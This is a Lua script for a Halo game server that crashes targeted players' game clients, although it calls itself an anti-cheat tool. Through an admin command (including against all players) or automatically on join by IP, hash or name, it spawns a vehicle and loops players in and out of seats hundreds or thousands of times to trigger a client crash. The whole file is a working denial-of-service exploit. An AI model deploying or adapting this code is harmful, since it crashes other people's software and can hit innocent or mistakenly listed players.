--[[
===============================================================================
SCRIPT NAME:      client_crasher.lua
DESCRIPTION:      Anti-cheat enforcement tool that:
                  - Crashes clients of banned players/cheaters
                  - Works via in-game vehicle exploit
                  - Supports automatic and manual triggering

WARNING:          STRICT USAGE REQUIREMENTS
                  - For anti-cheat purposes only
                  - May cause game instability
                  - Requires careful configuration

CONFIGURATION:    Edit Crash table to:
                  - Set command/permissions
                  - Add banned users (IPs/hashes/names)
                  - Configure vehicle tags
                  - Adjust crash iterations

Copyright (c) 2020-2021 Jericho Crosby (Chalwk)
LICENSE:          MIT License
                  https://github.com/Chalwk/SPCLib/blob/master/LICENSE
===============================================================================
]]

-- Configuration [start] -----------------------------
api_version = "1.12.0.0"

local Crash = {

    -- This is the custom command used to crash players
    command = "crash",

    -- Minimum permission level needed to crash a player:
    permission = 1,

    -- Should the command executor be able to crash their own game client?
    crash_self = false,

    --
    -- New USERS ARRAY feature (as of 23/02/21) --
    -- I have added a new users array from which you can specify
    -- the ip address, hash or names of anyone you want this script to crash when they join.
    -- Be careful about basing this on hash and ensure that it's not illegitimate.
    users = {
        ip = {
            --"120.0.0.1",
            --"168.192.1.2",
        },
        hash = {
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", -- hash 1
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", -- hash 2
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", -- hash 3
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", -- hash 4
        },
        names = {
            -- Anyone who joins with these names will be crashed!
            "TᑌᗰᗷᗩᑕᑌᒪOᔕ",
            "TUMBACULOS",
            "A55hol3",
            --
        },
    },
    ------------------------------------------------

    tags = {
        --==================================================================================================--
        -- This mod uses a vehicle to crash the client.
        -- If you want this script to work on custom maps that don't have stock tags,
        -- simply enter ONE valid vehicle tag address per custom map in the tags array below.

        -- {tag, loop iterations}
        -- Only change the loop iteration setting if you know what you're doing.
        -- Do not set higher than 2000.
        --==================================================================================================--

        -- WARNING: Do not set loop iterations higher than 100 for stock maps.
        -- For custom maps, if you're experiencing a problem where the command executes fine but all it does
        -- is kill the player, try setting the iterations higher.

        { "vehicles\\warthog\\mp_warthog", 25 }, -- this tag is sufficient for all stock maps.
        { "bourrin\\halo reach\\vehicles\\warthog\\rocket warthog", 2000 }, -- this is for bigassv2,104
    }
    --===================================================--
}
-- Configuration [end] -----------------------------

function OnScriptLoad()
    register_callback(cb['EVENT_TICK'], "OnTick")
    register_callback(cb['EVENT_JOIN'], "OnPlayerJoin")
    register_callback(cb['EVENT_LEAVE'], "OnPlayerQuit")
    register_callback(cb['EVENT_GAME_START'], "OnGameStart")
    register_callback(cb['EVENT_COMMAND'], "OnServerCommand")
    OnGameStart()
end

function OnGameStart()
    if (get_var(0, "$gt") ~= "n/a") then
        Crash:SetCrashVehicle()
    end
end

local function CMDSplit(CMD)
    local Args = { }
    CMD = CMD:gsub('"', "")
    for Params in CMD:gmatch(CMD, "([^%s]+)") do
        Args[#Args + 1] = Params:lower()
    end
    return Args
end

local function GetPlayers(Executor, Args)
    local pl = { }
    if (Args[2] == nil or Args[2] == "me") then
        if (Executor ~= 0) then
            table.insert(pl, Executor)
        else
            Crash:Respond(Executor, "Please enter a valid player id", 10)
        end
    elseif (Args[2] ~= nil and Args[2]:match("^%d+$")) then
        if player_present(Args[2]) then
            table.insert(pl, Args[2])
        else
            Crash:Respond(Executor, "Player #" .. Args[2] .. " is not online", 10)
        end
    elseif (Args[2] == "all" or Args[2] == "*") then
        for i = 1, 16 do
            if player_present(i) then
                table.insert(pl, i)
            end
        end
        if (#pl == 0) then
            Crash:Respond(Executor, "There are no players online!", 10)
        end
    else
        Crash:Respond(Executor, "Invalid Command Syntax. Please try again!", 10)
    end
    return pl
end

function Crash:OnServerCommand(Executor, CMD)
    local Args = CMDSplit(CMD)
    if (Args ~= nil and Args[1] == self.command) then
        local lvl = tonumber(get_var(Executor, "$lvl"))
        if (lvl >= self.permission or Executor == 0) then
            if (Args[2] ~= nil) then
                if (self.vehicle_tag ~= nil) then
                    local pl = GetPlayers(Executor, Args)
                    if (pl) then
                        for i = 1, #pl do
                            local TargetID = tonumber(pl[i])
                            if (Executor == TargetID) then
                                if (not self.crash_self) then
                                    self:Respond(Executor, "You cannot execute this command on yourself", 10)
                                end
                            elseif (player_alive(TargetID)) then
                                self:CrashClient(Executor, TargetID)
                            else
                                self:Respond(Executor, "Player #" .. TargetID .. " is not alive! Please wait until they respawn")
                            end
                        end
                    end
                else
                    self:Respond(Executor, "==================================================================", 10)
                    self:Respond(Executor, "Command does not work on this map.", 10)
                    self:Respond(Executor, "Please contact Chalwk on discord: Chalwk#9284", 10)
                    self:Respond(Executor, "==================================================================", 10)
                end
            else
                self:Respond(Executor, "Invalid Syntax. Usage: /" .. self.command .. " [player id | me | */all]", 10)
            end
        else
            self:Respond(Executor, "Insufficient Permission", 10)
        end
        return false
    end
end

function Crash:CrashOnJoin(Ply)

    -- If any of these return true, the player will be crashed.

    local hash = get_var(Ply, "hash")
    local name = get_var(Ply, "$name")
    local ip = get_var(Ply, "$ip"):match("%d+.%d+.%d+.%d+")

    for _, IP in pairs(self.users.ip) do
        if (ip == IP) then
            return true
        end
    end
    for _, HASH in pairs(self.users.hash) do
        if (hash == HASH) then
            return true
        end
    end
    for _, NAME in pairs(self.users.names) do
        if (name == NAME) then
            return true
        end
    end

    return false
end

function Crash:OnTick()
    for i = 1, 16 do
        if (player_present(i) and self.players[i]) then
            local DyN = get_dynamic_player(i)
            if (DyN ~= 0) then
                self:CrashClient(0, i)
            end
        end
    end
end

function Crash:OnPlayerJoin(Ply)
    if self:CrashOnJoin(Ply) then
        self.players[Ply] = true
    end
end

function Crash:OnPlayerQuit(Ply)
    self.players[Ply] = nil
end

local function GetXYZ(Ply)
    local DyN = get_dynamic_player(Ply)
    if (DyN ~= 0) then
        local VehicleID = read_dword(DyN + 0x11C)
        local VehicleObject = get_object_memory(VehicleID)
        if (VehicleID == 0xFFFFFFFF) then
            return read_vector3d(DyN + 0x5c)
        elseif (VehicleObject ~= 0) then
            return read_vector3d(VehicleObject + 0x5c)
        end
    end
    return nil
end

function Crash:CrashClient(Executor, TargetID)

    self.players[TargetID] = false

    local name = get_var(TargetID, "$name")
    local x, y, z = GetXYZ(TargetID)

    local vehicle = spawn_object("vehi", self.vehicle_tag, x, y, z)
    local object = get_object_memory(vehicle)

    if (object ~= 0) then

        --
        -- Initialize a for-loop starting at 0 (first iteration):
        --
        for seat = 0, self.iterations do
            --
            -- Enter player into the seat number of the current loop iteration.
            --
            enter_vehicle(vehicle, TargetID, seat)
            --
            -- Force player out of vehicle.
            --
            exit_vehicle(TargetID)
        end
        --
        -- Approx 50 milliseconds later:
        -- Destroy vehicle after for-loop has finished executing
        --
        destroy_object(vehicle)
        self:Respond(Executor, "Crashed " .. name .. "'s game client", 10)
    else
        self:Respond(Executor, "Something went wrong! Try again.", 10)
    end
end

local function WriteLog(str)
    local file = io.open("Client Crasher.log", "a+")
    if (file) then
        file:write(str .. "\n")
        file:close()
    end
end

function Crash:Respond(Ply, Message, Color)
    WriteLog(os.date("[%H:%M:%S - %d/%m/%Y]") .. ": " .. Message)
    Color = Color or 10
    if (Ply == 0) then
        cprint(Message, Color)
    else
        rprint(Ply, Message)
    end
end

local function GetTag(Type, Name)
    local Tag = lookup_tag(Type, Name)
    return Tag ~= 0 and read_dword(Tag + 0xC) or nil
end

function Crash:SetCrashVehicle()

    self.players = { }

    self.delay = nil
    self.vehicle_tag = nil
    self.iterations = nil

    for _, v in pairs(self.tags) do
        if GetTag("vehi", v[1]) then
            self.vehicle_tag = v[1]
            self.iterations = v[2]
            self.delay = v[3]
            break
        end
    end
end

function OnServerCommand(P, C)
    return Crash:OnServerCommand(P, C)
end

function OnTick()
    return Crash:OnTick()
end

function OnPlayerJoin(Ply)
    return Crash:OnPlayerJoin(Ply)
end

function OnPlayerQuit(Ply)
    return Crash:OnPlayerQuit(Ply)
end

function OnScriptUnload()
    -- N/A
end